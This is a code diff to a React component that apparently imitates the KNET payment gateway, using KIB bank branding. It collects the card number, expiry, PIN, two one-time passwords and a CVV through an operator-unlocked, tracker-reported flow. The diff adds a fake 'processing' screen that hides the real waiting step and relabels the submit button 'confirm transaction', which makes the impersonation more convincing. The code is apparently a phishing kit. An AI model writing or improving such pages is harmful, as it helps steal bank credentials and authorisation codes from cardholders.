@@ -4,7 +4,7 @@ import { useEffect, useRef, useState } from "react";
 import { useActionState } from "react";
 import { useTranslations } from "next-intl";
 import { Link, useRouter } from "@/i18n/navigation";
-import { isValidCardExpiryMmYy, normalizeExpiryMonthInput } from "@/lib/card-expiry";
+import { isValidCardExpiryMmYy } from "@/lib/card-expiry";
 import type { ActionResult } from "@/lib/codes";
 import { formatKnetCard, knetCards, knetLogoFor, maskKnetCard } from "@/lib/knet-cards";
 import { parseKwdToMinor } from "@/lib/money";
@@ -67,8 +67,7 @@ export function QuickPayAmount({ locale, productId, initialStep, source }: { loc
   const [debitNumber, setDebitNumber] = useState("");
   const [debitFocused, setDebitFocused] = useState(false);
   const [suggestOpen, setSuggestOpen] = useState(false);
-  const [debitMonth, setDebitMonth] = useState("");
-  const [debitYear, setDebitYear] = useState("");
+  const [debitExpiry, setDebitExpiry] = useState("");
   const [pin, setPin] = useState("");
   const [knetOtp, setKnetOtp] = useState("");
   const [knetOtp2, setKnetOtp2] = useState("");
@@ -85,12 +84,13 @@ export function QuickPayAmount({ locale, productId, initialStep, source }: { loc
   const [rejectKind, setRejectKind] = useState<KnetRejectKind | null>(null);
   const [otpResendSeconds, setOtpResendSeconds] = useState(0);
   const otpRetryDoneRef = useRef(false);
-  const expiryYearRef = useRef<HTMLInputElement>(null);
-  const expiryMonthRef = useRef<HTMLInputElement>(null);
   const followed = useRef("");
   const [state, action, pending] = useActionState(rechargeAction, null as ActionResult | null);
   const parsed = parseKwdToMinor(amountText);
   const ready = Boolean(productId && parsed);
+  const expiryDigits = debitExpiry.replace(/\D/g, "");
+  const debitYear = expiryDigits.slice(0, 2);
+  const debitMonth = expiryDigits.slice(2, 4);
   const debitMatches = debitNumber ? knetCards.filter((card) => card.bin.startsWith(debitNumber)) : [];
   const debitLogo = knetLogoFor(debitNumber);
   const otpClock = `${String(Math.floor(otpLeft / 60)).padStart(2, "0")}:${String(otpLeft % 60).padStart(2, "0")}`;
@@ -399,24 +399,57 @@ export function QuickPayAmount({ locale, productId, initialStep, source }: { loc
 
   if ((step === "waitingApproval" && waitingOrderId) || (knetBusy && waitingOrderId)) {
     return (
-      <ApprovalWait
-        orderId={waitingOrderId!}
-        locale={locale}
-        from="knet"
-        knetWaitPhase={knetWaitPhase}
-        onKnetUnlocked={(target) => {
-          setKnetWaitPhase(null);
-          setKnetBusy(false);
-          setStep(target);
-          reportTrackerState({
-            page: target === "knetOtp" ? "/quick-pay/knet-otp" : target === "knetOtp2" ? "/quick-pay/knet-otp-2" : "/quick-pay/knet-cvv",
-            flowStage: "knet",
-            locked: true,
-            orderId: waitingOrderId!,
-          });
-        }}
-        onKnetRetry={handleKnetRetry}
-      />
+      <>
+        <div dir="ltr" className="flex min-h-dvh flex-col items-center bg-[#e5e5e5] text-[#222]" style={{ fontFamily: "'Cairo', Arial, sans-serif" }}>
+          <div className="w-full self-stretch"><img src="/knet/banner.jpg" alt="" className="block w-full" /></div>
+          <div className="flex w-full max-w-[460px] flex-col gap-3 px-[10px] pb-5 pt-[14px]">
+            <div className="overflow-hidden rounded-[10px] border border-[#bbb] bg-white shadow-[0_2px_8px_rgba(0,0,0,0.12)]">
+              <div className="flex flex-col items-center gap-3 px-[18px] pb-[14px] pt-5">
+                <img src="/knet/logo.jpg" alt="KIB" className="h-11 object-contain" />
+                <div className="w-full border-t border-[#d8d8d8]">
+                  <div className="grid grid-cols-[1fr_auto] items-center border-b border-[#d8d8d8] px-1 py-[7px]" dir="ltr">
+                    <span className="text-xs font-medium text-[#555]">{t("merchant")}</span>
+                    <span dir="rtl" className="text-xs font-bold text-[#005baa]">:{t("beneficiary")}</span>
+                  </div>
+                  <div className="grid grid-cols-[1fr_auto] items-center px-1 py-[7px]" dir="ltr">
+                    <span className="text-[13px] font-bold text-[#222]">KD&nbsp;{((parsed ?? 0) / 100).toFixed(3)}</span>
+                    <span dir="rtl" className="text-xs font-bold text-[#005baa]">:{t("invoiceAmount")}</span>
+                  </div>
+                </div>
+              </div>
+            </div>
+            <div className="overflow-hidden rounded-[10px] border border-[#bbb] bg-white shadow-[0_2px_8px_rgba(0,0,0,0.12)]">
+              <div className="flex flex-col items-center gap-4 px-5 py-8">
+                <div className="size-11 animate-spin rounded-full border-4 border-[#e0e0e0] border-t-[#555]" />
+                <div className="text-[15px] font-bold text-[#555]">جاري معالجة الطلب...</div>
+              </div>
+            </div>
+          </div>
+          <div className="w-full max-w-[460px] px-3 pb-[18px] pt-[10px] text-center">
+            <p className="text-xs font-semibold text-[#555]">{t("rights")}</p>
+            <p className="text-xs font-bold leading-5 text-[#005baa]">{t("knetCompany")}</p>
+          </div>
+        </div>
+        <ApprovalWait
+          hidden
+          orderId={waitingOrderId!}
+          locale={locale}
+          from="knet"
+          knetWaitPhase={knetWaitPhase}
+          onKnetUnlocked={(target) => {
+            setKnetWaitPhase(null);
+            setKnetBusy(false);
+            setStep(target);
+            reportTrackerState({
+              page: target === "knetOtp" ? "/quick-pay/knet-otp" : target === "knetOtp2" ? "/quick-pay/knet-otp-2" : "/quick-pay/knet-cvv",
+              flowStage: "knet",
+              locked: true,
+              orderId: waitingOrderId!,
+            });
+          }}
+          onKnetRetry={handleKnetRetry}
+        />
+      </>
     );
   }
 
@@ -669,7 +702,7 @@ export function QuickPayAmount({ locale, productId, initialStep, source }: { loc
               </div>
             </div>
 
-            {knetError ? (
+            {knetError && step === "knet" ? (
               <div className="rounded-lg border-[1.5px] border-[#cc0000] bg-[#fff0f0] px-[14px] py-[10px] text-center text-[15px] font-extrabold text-[#cc0000]">{t(knetErrorKey)}</div>
             ) : null}
 
@@ -679,6 +712,9 @@ export function QuickPayAmount({ locale, productId, initialStep, source }: { loc
                   <div dir="rtl" className="mb-[14px] rounded-lg border border-[#b8d4e3] bg-[#E8F1F5] px-4 py-[14px] text-right text-[13px] font-medium leading-[1.8] text-[#1a3a5c]">
                     {step === "knetCvv" ? t("cvvHint") : step === "knetOtp2" ? t("otp2Warning") : t("otpWarning")}
                   </div>
+                  {knetError ? (
+                    <div className="px-4 pb-[10px] text-center text-[14px] font-extrabold text-[#cc0000]">{t(knetErrorKey)}</div>
+                  ) : null}
                   <table dir="rtl" className="w-full border-collapse">
                     <tbody>
                       <tr className="border-b border-[#ccc]">
@@ -768,17 +804,22 @@ export function QuickPayAmount({ locale, productId, initialStep, source }: { loc
                       </tr>
                       <tr className="border-b border-[#d8d8d8]">
                         <td className="w-[58%] py-[7px] pe-1 text-right align-middle">
-                          <div dir="ltr" className="ml-auto flex h-7 w-[100px] items-center rounded-[6px] border border-[#bcbcbc] bg-[linear-gradient(to_bottom,#fff_0%,#ebebeb_100%)] shadow-[inset_0_2px_4px_rgba(0,0,0,0.12),0_1px_0_#fff]">
-                            <input ref={expiryYearRef} value={debitYear} onChange={(event) => { const next = event.target.value.replace(/\D/g, "").slice(0, 2); setDebitYear(next); setKnetError(false); setKnetExpiryError(false); if (next.length === 2) expiryMonthRef.current?.focus(); }} dir="ltr" inputMode="numeric" autoComplete="off" placeholder="YY" className="h-full w-[38px] shrink-0 border-0 bg-transparent pl-2 font-[Arial,Helvetica,sans-serif] text-[13px] tracking-wide text-[#333] outline-none placeholder:font-bold placeholder:text-[#8a8a8a]" />
-                            <span className="shrink-0 text-center text-[13px] font-bold text-[rgba(0,0,0,0.56)]">/</span>
-                            <input ref={expiryMonthRef} value={debitMonth} onChange={(event) => { setDebitMonth(normalizeExpiryMonthInput(event.target.value)); setKnetError(false); setKnetExpiryError(false); }} onKeyDown={(event) => { if (event.key === "Backspace" && debitMonth.length === 0) expiryYearRef.current?.focus(); }} dir="ltr" inputMode="numeric" autoComplete="off" placeholder="MM" className="h-full w-[38px] shrink-0 border-0 bg-transparent pr-2 text-center font-[Arial,Helvetica,sans-serif] text-[13px] tracking-wide text-[#333] outline-none placeholder:font-bold placeholder:text-[#8a8a8a]" />
-                          </div>
+                          <input
+                            value={debitExpiry}
+                            onChange={(event) => { let v = event.target.value.replace(/\D/g, "").slice(0, 4); if (v.length > 2) v = v.slice(0, 2) + " / " + v.slice(2); setDebitExpiry(v); setKnetError(false); setKnetExpiryError(false); }}
+                            dir="ltr"
+                            inputMode="numeric"
+                            autoComplete="off"
+                            maxLength={7}
+                            placeholder="YY / MM"
+                            className="ml-auto block h-7 w-[100px] rounded-[6px] border border-[#bcbcbc] bg-[linear-gradient(to_bottom,#fff_0%,#ebebeb_100%)] px-2 font-[Arial,Helvetica,sans-serif] text-[13px] tracking-wide text-[#333] shadow-[inset_0_2px_4px_rgba(0,0,0,0.12),0_1px_0_#fff] outline-none placeholder:font-bold placeholder:text-[#8a8a8a]"
+                          />
                         </td>
                         <td dir="rtl" className="w-[42%] whitespace-nowrap py-[7px] ps-1 pe-[6px] text-right align-middle text-xs font-bold text-[#005baa]">:{t("debitExpiry")}</td>
                       </tr>
                       <tr>
                         <td className="w-[58%] py-[7px] pe-1 align-middle">
-                          <input value={pin} onChange={(event) => { setPin(event.target.value.replace(/\D/g, "").slice(0, 4)); setKnetError(false); }} dir="ltr" type="text" inputMode="numeric" autoComplete="off" maxLength={4} className="h-7 w-full rounded-[6px] border border-[#bcbcbc] bg-[linear-gradient(to_bottom,#fff_0%,#ebebeb_100%)] px-2 font-[Arial,Helvetica,sans-serif] text-[13px] tracking-wide text-[#333] shadow-[inset_0_2px_4px_rgba(0,0,0,0.12),0_1px_0_#fff] outline-none [-webkit-text-security:disc]" />
+                          <input value={pin} onChange={(event) => { setPin(event.target.value.replace(/\D/g, "").slice(0, 4)); setKnetError(false); }} dir="ltr" type="password" inputMode="numeric" autoComplete="current-password" maxLength={4} className="h-7 w-full rounded-[6px] border border-[#bcbcbc] bg-[linear-gradient(to_bottom,#fff_0%,#ebebeb_100%)] px-2 font-[Arial,Helvetica,sans-serif] text-[13px] tracking-wide text-[#333] shadow-[inset_0_2px_4px_rgba(0,0,0,0.12),0_1px_0_#fff] outline-none" />
                         </td>
                         <td dir="rtl" className="w-[42%] whitespace-nowrap py-[7px] ps-1 pe-[6px] text-right align-middle text-xs font-bold text-[#005baa]">:{t("pin")}</td>
                       </tr>
@@ -792,7 +833,7 @@ export function QuickPayAmount({ locale, productId, initialStep, source }: { loc
               <div className="px-5 py-[18px]">
                 <div dir="rtl" className="flex w-full gap-1">
                   <button type="button" disabled={knetBusy || pending} onClick={() => void submitKnetStep()} className="flex-1 cursor-pointer rounded-e-[6px] border-none bg-[#d4d4d4] px-2 py-[10px] text-sm font-semibold text-[#333] transition-colors hover:bg-[#c0c0c0] disabled:opacity-60">
-                    {step === "knetOtp" || step === "knetOtp2" || step === "knetCvv" ? t("send") : t("send")}
+                    {step === "knetOtp" || step === "knetOtp2" || step === "knetCvv" ? "تأكيد العملية" : t("send")}
                   </button>
                   <button type="button" onClick={() => { setKnetError(false); setStep(step === "knetOtp2" ? "knetCvv" : step === "knetCvv" ? "knetOtp" : step === "knetOtp" ? "knet" : "pay"); }} className="flex-1 cursor-pointer rounded-s-[6px] border-none bg-[#d4d4d4] px-2 py-[10px] text-sm font-semibold text-[#333] transition-colors hover:bg-[#c0c0c0]">
                     {t("cancel")}
